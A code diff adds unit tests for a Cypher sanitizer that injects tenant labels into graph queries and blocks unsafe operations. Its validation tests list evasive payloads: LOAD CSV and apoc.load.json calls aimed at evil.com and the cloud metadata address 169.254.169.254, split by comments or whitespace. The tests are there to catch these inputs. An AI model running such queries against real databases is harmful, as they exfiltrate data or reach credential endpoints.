@@ -1,9 +1,11 @@
 """Unit tests for the Cypher sanitizer (validation + provider-label injection)."""
 
+import re
 from unittest.mock import patch
 
 import pytest
 from api.attack_paths.cypher_sanitizer import (
+    inject_label,
     inject_provider_label,
     validate_custom_query,
 )
@@ -19,6 +21,45 @@ def _inject(cypher: str) -> str:
         "api.attack_paths.cypher_sanitizer.get_provider_label", return_value=LABEL
     ):
         return inject_provider_label(cypher, PROVIDER_ID)
+
+
+# String literals and line comments can contain parentheses that look like node
+# patterns; strip them first. Implemented here independently of the sanitizer so
+# the node count is an oracle for the injector rather than a copy of its regexes.
+_STRING_OR_COMMENT_RE = re.compile(r"'(?:[^'\\]|\\.)*'|\"(?:[^\"\\]|\\.)*\"|//[^\n]*")
+
+# A node pattern is `(`, not preceded by a word char (which would make it a
+# function call), wrapping an optional variable, zero or more `:Label`s and an
+# optional `{property map}` - and nothing else, which excludes parenthesized
+# expressions such as `(a OR b)` in a WHERE clause.
+_NODE_PATTERN_RE = re.compile(
+    r"(?<![\w`])\("
+    r"\s*(?:[a-zA-Z_]\w*)?"
+    r"(?:\s*:\s*(?:`[^`]*`|[a-zA-Z_]\w*))*"
+    r"(?:\s*\{[^{}]*\})?"
+    r"\s*\)"
+)
+
+
+def _count_node_patterns(cypher: str) -> int:
+    """Count node patterns in a query, independently of the injector.
+
+    Injection appends exactly one provider label per node pattern, so the
+    number of injected labels must equal this count - proving *every* node is
+    scoped, not just one."""
+    stripped = _STRING_OR_COMMENT_RE.sub("", cypher)
+    return sum(
+        1
+        for match in _NODE_PATTERN_RE.finditer(stripped)
+        if match.group(0)[1:-1].strip()
+    )
+
+
+def test_generic_inject_label_reuses_provider_injection_pipeline():
+    result = inject_label("MATCH (n:AWSRole)--(m) RETURN n, m", "_Tenant_test")
+
+    assert "(n:AWSRole:_Tenant_test)" in result
+    assert "(m:_Tenant_test)" in result
 
 
 # ---------------------------------------------------------------------------
@@ -179,6 +220,12 @@ class TestProtection:
     def test_escaped_quotes_in_string(self):
         cypher = r"MATCH (n:AWSRole) WHERE n.name = 'it\'s a test' RETURN n"
         result = _inject(cypher)
+        assert result.count(LABEL) == 1
+
+    def test_block_comment_with_node_pattern(self):
+        cypher = "MATCH (n:AWSRole) /* (m:Fake)\n(k) */ RETURN n"
+        result = _inject(cypher)
+        assert "/* (m:Fake)\n(k) */" in result
         assert result.count(LABEL) == 1
 
 
@@ -401,12 +448,43 @@ class TestValidation:
     @pytest.mark.parametrize(
         "cypher",
         [
+            "LOAD /* c */ CSV FROM 'http://169.254.169.254/' AS x RETURN x",
+            "LOAD/**/CSV FROM 'http://evil.com' AS x RETURN x",
+            "LOAD /* a */ /* b */ CSV FROM 'http://evil.com' AS x RETURN x",
+            "LOAD /* multi\nline */ CSV FROM 'http://evil.com' AS x RETURN x",
+            "CALL apoc./**/load.json('http://evil.com/') YIELD value RETURN value",
+            "CALL apoc . load.json('http://evil.com/') YIELD value RETURN value",
+            "CALL apoc.load . json('http://evil.com/') YIELD value RETURN value",
+            "CALL apoc\n.cypher.run('CREATE (n)', {}) YIELD value RETURN value",
+        ],
+        ids=[
+            "LOAD_CSV_block_comment",
+            "LOAD_CSV_empty_block_comment",
+            "LOAD_CSV_two_block_comments",
+            "LOAD_CSV_multiline_block_comment",
+            "apoc.load_block_comment",
+            "apoc.load_spaces_around_dot",
+            "apoc.load_spaces_before_procedure",
+            "apoc.cypher_newline_before_dot",
+        ],
+    )
+    def test_rejects_blocked_patterns_split_by_comments_or_whitespace(self, cypher):
+        with pytest.raises(ValidationError) as exc:
+            validate_custom_query(cypher)
+
+        assert "blocked operation" in str(exc.value.detail)
+
+    @pytest.mark.parametrize(
+        "cypher",
+        [
             "MATCH (n:AWSAccount) RETURN n LIMIT 10",
             "MATCH (a)-[r]->(b) RETURN a, r, b",
             "MATCH (n) WHERE n.name CONTAINS 'load' RETURN n",
             "CALL apoc.create.vNode(['Label'], {}) YIELD node RETURN node",
             "MATCH (n) WHERE n.name = 'apoc.load.json' RETURN n",
             'MATCH (n) WHERE n.description = "LOAD CSV is cool" RETURN n',
+            "MATCH (n) /* LOAD CSV is documented here */ RETURN n",
+            "MATCH (n) WHERE n.note = '/* LOAD CSV */' RETURN n",
         ],
         ids=[
             "simple_match",
@@ -415,7 +493,72 @@ class TestValidation:
             "apoc_virtual_node",
             "apoc_load_inside_single_quotes",
             "load_csv_inside_double_quotes",
+            "load_csv_inside_block_comment",
+            "block_comment_inside_string",
         ],
     )
     def test_allows_clean_queries(self, cypher):
         validate_custom_query(cypher)
+
+
+# ---------------------------------------------------------------------------
+# Predefined-catalog injection (Option 1: label-scoped predefined queries)
+# ---------------------------------------------------------------------------
+
+
+def _all_predefined_queries():
+    """Every predefined query in the migrated catalog, as (id, cypher)."""
+    from api.attack_paths.queries.registry import _QUERY_DEFINITIONS
+
+    return [
+        (definition.id, definition.cypher)
+        for definitions in _QUERY_DEFINITIONS.values()
+        for definition in definitions
+    ]
+
+
+_PREDEFINED_QUERIES = _all_predefined_queries()
+
+
+class TestPredefinedCatalogInjection:
+    """`execute_query` injects the provider label into predefined queries on
+    migrated graphs. The injection must be *lossless* for every catalog query:
+    it may only insert `:_Provider_{uuid}` tokens and must not otherwise alter
+    the cypher (which would corrupt a hand-authored query). This runs over the
+    whole catalog so a regex regression is caught for all queries at once.
+
+    Injection is a pure string transform, so it is sink-independent (the same
+    result is sent to Neo4j and Neptune)."""
+
+    def test_catalog_is_not_empty(self):
+        # Guard against the parametrized tests silently covering nothing.
+        assert len(_PREDEFINED_QUERIES) > 0
+
+    @pytest.mark.parametrize(
+        "cypher",
+        [cypher for _, cypher in _PREDEFINED_QUERIES],
+        ids=[query_id for query_id, _ in _PREDEFINED_QUERIES],
+    )
+    def test_injection_is_lossless(self, cypher):
+        injected = _inject(cypher)
+
+        # Every node pattern is scoped - not just one. A partial-injection
+        # regression that missed some nodes would still satisfy a bare
+        # `f":{LABEL}" in injected` check, so assert the label count matches the
+        # number of node patterns.
+        assert injected.count(f":{LABEL}") == _count_node_patterns(cypher)
+        # Stripping the injected tokens restores the query verbatim, proving
+        # injection changed nothing but the labels.
+        assert injected.replace(f":{LABEL}", "") == cypher
+
+    @pytest.mark.parametrize(
+        "cypher",
+        [cypher for _, cypher in _PREDEFINED_QUERIES],
+        ids=[query_id for query_id, _ in _PREDEFINED_QUERIES],
+    )
+    def test_injection_preserves_parameter_placeholders(self, cypher):
+        # Label injection must never touch `$param` bindings.
+        original_params = sorted(set(re.findall(r"\$\w+", cypher)))
+        injected_params = sorted(set(re.findall(r"\$\w+", _inject(cypher))))
+
+        assert injected_params == original_params
